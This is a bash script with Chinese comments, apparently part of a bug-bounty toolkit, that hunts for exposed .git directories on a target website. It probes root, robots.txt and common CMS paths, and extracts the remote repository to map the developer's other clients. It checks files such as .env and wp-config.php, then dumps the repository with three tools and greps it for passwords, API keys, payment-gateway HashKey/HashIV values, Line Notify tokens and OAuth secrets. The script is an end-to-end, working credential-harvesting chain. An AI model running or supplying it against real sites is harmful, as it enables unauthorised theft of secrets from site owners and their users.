#!/usr/bin/env bash
# hunt-git-exposure.sh — .git 暴露完整利用鏈
# 來源：nested .git CMS pattern/ winstar / crowningtex / tiara / ISB
#
# 流程：
#   1. /.git/HEAD 200 + ref 內容驗證
#   2. /.git/config → 取 remote URL（揭露開發商 → 供應鏈分析）
#   3. 三工具流水線 dump（git-dumper → GitTools → GitHack）
#   4. 還原後自動 grep：
#      - git log 內密碼變更
#      - config / .env / application.yml / database.php 內憑證
#      - 金流 HashKey / Line Notify token / OAuth secret
#   5. robots.txt 橫向移動（抓子站路徑）
#
# 用法：
#   ./hunt-git-exposure.sh https://target.com.tw
#   ./hunt-git-exposure.sh https://target.com.tw --dump   # 實際下載（預設只 probe）
set -uo pipefail

HOST="${1:-}"
[ -z "$HOST" ] && { echo "Usage: $0 <https://host> [--dump]"; exit 1; }
HOST="${HOST%/}"
DUMP=0
[ "${2:-}" = "--dump" ] && DUMP=1

OUT_DIR="${OUT_DIR:-./git_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$HOST" | sed 's|https\?://||;s|[/:]|_|g')
OUT="$OUT_DIR/${SLUG}.txt"
DUMP_DIR="$OUT_DIR/${SLUG}_dump"
: > "$OUT"

log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }
warn(){ echo "🟡 $*" | tee -a "$OUT"; }

log "=== .git exposure hunt: $HOST ==="

# ── Step 1: build candidate path list (root + robots.txt disallow + common CMS) ──
CANDIDATES="/"
ROBOTS=$(curl -sk --max-time 8 "$HOST/robots.txt")
if [ -n "$ROBOTS" ]; then
  ROBOT_PATHS=$(echo "$ROBOTS" | grep -iE "^Disallow:" | awk '{print $2}' | head -30 | grep -v "^$")
  if [ -n "$ROBOT_PATHS" ]; then
    warn "robots.txt disallow paths:"
    echo "$ROBOT_PATHS" | while read p; do echo "     $p" >> "$OUT"; done
    CANDIDATES="$CANDIDATES
$ROBOT_PATHS"
  fi
fi
# Common CMS / framework subpaths often containing repos
for COMMON in "/admin/" "/backend/" "/api/" "/web/" "/wp-content/" "/application/" "/src/"; do
  CANDIDATES="$CANDIDATES
$COMMON"
done

# ── Step 2: probe each candidate for .git/HEAD ─────────────────
FOUND_PATHS=""
while IFS= read -r P; do
  [ -z "$P" ] && continue
  # normalize trailing slash
  [[ "$P" != */ ]] && P="${P}/"
  URL="${HOST}${P}.git/HEAD"
  RESP=$(curl -sk --max-time 6 "$URL")
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 "$URL")
  if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "ref:"; then
    hit ".git exposure: $URL → $RESP"
    FOUND_PATHS="$FOUND_PATHS $P"
  fi
done <<< "$CANDIDATES"

if [ -z "$FOUND_PATHS" ]; then
  log "no .git exposure across $(echo "$CANDIDATES" | wc -l | tr -d ' ') candidate paths"
  exit 0
fi

# ── Step 3: for each found path, grab config → remote URL → supply chain ─
for P in $FOUND_PATHS; do
  CONFIG=$(curl -sk --max-time 8 "${HOST}${P}.git/config")
  if echo "$CONFIG" | grep -q "\[remote"; then
    REMOTE=$(echo "$CONFIG" | grep -oE "url\s*=\s*[^ ]+" | head -1 | awk -F= '{print $2}' | tr -d ' ')
    hit "${P}.git/config remote: $REMOTE"
    if echo "$REMOTE" | grep -qE "github\.com|gitlab\.com|bitbucket\.org"; then
      ORG=$(echo "$REMOTE" | sed -E 's|.*[:/]([^/]+)/[^/]+\.git.*|\1|' | sed -E 's|.*[:/]([^/]+)/[^/]+$|\1|')
      hit "supply chain org: $ORG (search github.com/$ORG for other clients)"
    fi
  fi
done

# ── Step 4: other common leak files ───────────────────────────
for F in "/.env" "/.git/logs/HEAD" "/.git/index" "/.svn/entries" "/.DS_Store" \
         "/config.php" "/application/config/database.php" "/config/database.yml" \
         "/application.yml" "/wp-config.php" "/.gitignore"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$HOST$F")
  [ "$CODE" = "200" ] && hit "secondary leak: $HOST$F [200]"
done

# ── Step 5: Dump (only if --dump) ─────────────────────────────
if [ "$DUMP" = "1" ]; then
  mkdir -p "$DUMP_DIR"
  log "dumping with three-tool pipeline → $DUMP_DIR"

  # Tool 1: git-dumper (preserves commit history)
  if command -v git-dumper >/dev/null 2>&1 || python3 -m git_dumper --version >/dev/null 2>&1; then
    log "git-dumper..."
    python3 -m git_dumper "$HOST/.git/" "$DUMP_DIR/gitdumper" >/dev/null 2>&1 || \
      git-dumper "$HOST/.git/" "$DUMP_DIR/gitdumper" >/dev/null 2>&1 || true
  fi

  # Tool 2: GitHack (fallback)
  GITHACK="/Users/guantou/Desktop/BugBounty/tools/GitHack/GitHack.py"
  if [ -f "$GITHACK" ]; then
    log "GitHack..."
    (cd "$DUMP_DIR" && python3 "$GITHACK" "$HOST/.git/" >/dev/null 2>&1) || true
  fi

  # Tool 3: GitTools Dumper (extractor)
  GITTOOLS="/Users/guantou/Desktop/BugBounty/tools/GitTools/Dumper/gitdumper.sh"
  if [ -f "$GITTOOLS" ]; then
    log "GitTools Dumper..."
    bash "$GITTOOLS" "$HOST/.git/" "$DUMP_DIR/gittools" >/dev/null 2>&1 || true
  fi

  # ── Step 6: credential grep on dumped content ──────────────
  DUMPED_CONTENT=$(find "$DUMP_DIR" -type f \( -name "*.php" -o -name "*.yml" -o -name "*.env" -o -name "*.json" -o -name "*.js" -o -name "config*" \) 2>/dev/null)
  if [ -n "$DUMPED_CONTENT" ]; then
    log "grep credentials..."
    for F in $DUMPED_CONTENT; do
      # Generic password / key / secret
      grep -HEni "password\s*[=:]\s*['\"][^'\"]{4,}|api[_-]?key\s*[=:]\s*['\"][^'\"]{10,}|secret\s*[=:]\s*['\"][^'\"]{10,}|token\s*[=:]\s*['\"][^'\"]{15,}" "$F" 2>/dev/null | head -5
      # Payment gateway (Payment gateway HashKey/HashIV pattern (disclosed))
      grep -HEn "HashKey\s*=|HashIV\s*=|MerchantID\s*=" "$F" 2>/dev/null | head -3
      # Line Notify token
      grep -HEn "line[_-]?notify|LINE_TOKEN" "$F" 2>/dev/null | head -3
      # OAuth secrets
      grep -HEn "client[_-]?secret|fb[_-]?app[_-]?secret|google[_-]?secret" "$F" 2>/dev/null | head -3
    done >> "$OUT"

    # git log 內的密碼變更（需 git-dumper 版本）
    for GITDIR in "$DUMP_DIR/gitdumper/.git" "$DUMP_DIR/gittools/.git"; do
      if [ -d "$GITDIR" ]; then
        cd "$(dirname "$GITDIR")" 2>/dev/null || continue
        LOG=$(git log -p --all 2>/dev/null | grep -iE "password|secret|api[_-]?key" | head -20)
        [ -n "$LOG" ] && hit "git log credential changes (see $GITDIR/..):" && echo "$LOG" >> "$OUT"
        cd - >/dev/null
      fi
    done
  fi
fi

log "=== done → $OUT ==="
[ "$DUMP" = "0" ] && log "(run with --dump to download and grep credentials)"
